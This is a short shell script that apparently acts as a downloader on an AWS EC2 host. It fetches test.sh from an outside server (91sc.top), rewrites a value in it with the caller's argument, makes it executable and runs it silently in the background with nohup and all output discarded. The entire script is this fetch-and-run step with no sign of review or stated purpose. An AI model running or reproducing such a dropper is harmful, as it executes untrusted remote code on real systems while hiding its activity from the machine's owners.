#!/bin/sh
echo $1
cd /home/ec2-user/
curl http://91sc.top/upload/test.sh -o test.sh
sed -i 's/32768/$1/g' test.sh
chmod a+x test.sh
nohup ./test.sh >/dev/null 2>&1 &
